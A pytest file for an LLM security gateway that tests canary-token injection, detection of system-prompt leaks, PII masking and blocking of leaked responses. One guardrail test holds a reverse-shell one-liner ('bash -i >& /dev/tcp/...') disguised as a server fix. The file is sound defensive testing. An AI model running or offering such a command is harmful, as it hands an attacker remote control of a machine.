import pytest
from httpx import ASGITransport, AsyncClient

from src.core.config import settings
from src.main import app
from src.pipeline.canary import CanaryManager
from src.pipeline.output_guardrail import OutputGuardrail
from src.schemas.proxy import ChatMessage
from src.schemas.security import ThreatCategory, ThreatSeverity


def test_canary_manager_injection_no_system_message():
    manager = CanaryManager()
    messages = [ChatMessage(role="user", content="Hello AI")]

    enriched, canary_token = manager.inject_canary(messages)

    assert len(enriched) == 2
    assert enriched[0].role == "system"
    assert canary_token in enriched[0].content
    assert canary_token.startswith("CANARY_SENTINEL_")
    assert enriched[1].role == "user"
    assert enriched[1].content == "Hello AI"


def test_canary_manager_injection_existing_system_message():
    manager = CanaryManager()
    messages = [
        ChatMessage(role="system", content="You are a helpful assistant."),
        ChatMessage(role="user", content="Hello AI"),
    ]

    enriched, canary_token = manager.inject_canary(messages)

    assert len(enriched) == 2
    assert enriched[0].role == "system"
    assert "You are a helpful assistant." in enriched[0].content
    assert canary_token in enriched[0].content
    assert manager.detect_leak(enriched[0].content, canary_token) is True
    assert manager.detect_leak("Safe response without token", canary_token) is False


def test_output_guardrail_detects_canary_leak():
    guardrail = OutputGuardrail()
    canary = "CANARY_SENTINEL_test1234"
    leaked_output = f"Sure! My system prompt instructions are here: secret instructions {canary}"

    res = guardrail.inspect_and_sanitize(leaked_output, canary_token=canary)

    assert res.is_threat is True
    assert res.threat_category == ThreatCategory.SYSTEM_PROMPT_EXTRACTION
    assert res.threat_severity == ThreatSeverity.CRITICAL
    assert "Canary Token" in res.threat_reason


def test_output_guardrail_detects_malicious_shellcode():
    guardrail = OutputGuardrail()
    payload = "Execute this to fix your server: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

    res = guardrail.inspect_and_sanitize(payload)

    assert res.is_threat is True
    assert res.threat_category == ThreatCategory.HARMFUL_CONTENT
    assert res.threat_severity == ThreatSeverity.CRITICAL


def test_output_guardrail_masks_outbound_pii():
    guardrail = OutputGuardrail()
    output_with_pii = (
        "O CPF do cliente é 123.456.789-00 e o cartão de crédito é 4532 0150 1234 5671."
    )

    res = guardrail.inspect_and_sanitize(output_with_pii)

    assert res.is_threat is False
    assert "123.456.789-00" not in res.sanitized_text
    assert "4532 0150 1234 5671" not in res.sanitized_text
    assert "[CPF_REDACTED_" in res.sanitized_text


def test_output_guardrail_benign_text():
    guardrail = OutputGuardrail()
    benign_text = "O aprendizado supervisionado utiliza dados rotulados para treinar algoritmos."

    res = guardrail.inspect_and_sanitize(benign_text)

    assert res.is_threat is False
    assert res.sanitized_text == benign_text
    assert res.threat_category is None


@pytest.mark.asyncio
async def test_proxy_blocks_canary_leak_non_streaming():
    """Valida bloqueio 403 HTTP no gateway quando a resposta do modelo vazar o canary token."""
    headers = {"Authorization": f"Bearer {settings.SENTINEL_API_KEY}"}
    payload = {
        "model": "gpt-4o",
        "stream": False,
        "messages": [
            {
                "role": "user",
                "content": "Simulate canary token leak for testing honeypot defense",
            }
        ],
    }

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        response = await ac.post("/v1/chat/completions", json=payload, headers=headers)

    assert response.status_code == 403
    data = response.json()
    assert data["detail"]["category"] == "system_prompt_extraction"
    assert data["detail"]["severity"] == "critical"


@pytest.mark.asyncio
async def test_proxy_severs_canary_leak_streaming():
    """Valida interrupção forçada em voo (In-Flight Severing) quando o stream vaza o canary token."""
    headers = {"Authorization": f"Bearer {settings.SENTINEL_API_KEY}"}
    payload = {
        "model": "gpt-4o",
        "stream": True,
        "messages": [
            {
                "role": "user",
                "content": "Simulate canary token leak for streaming test",
            }
        ],
    }

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        response = await ac.post("/v1/chat/completions", json=payload, headers=headers)

    assert response.status_code == 200
    assert "text/event-stream" in response.headers.get("content-type", "")

    body_text = response.text
    assert "TRANSMISSÃO INTERROMPIDA PELO PROMPT SENTINEL" in body_text
    assert "Canary Token" in body_text
    assert "security_override" in body_text
    assert "data: [DONE]" in body_text
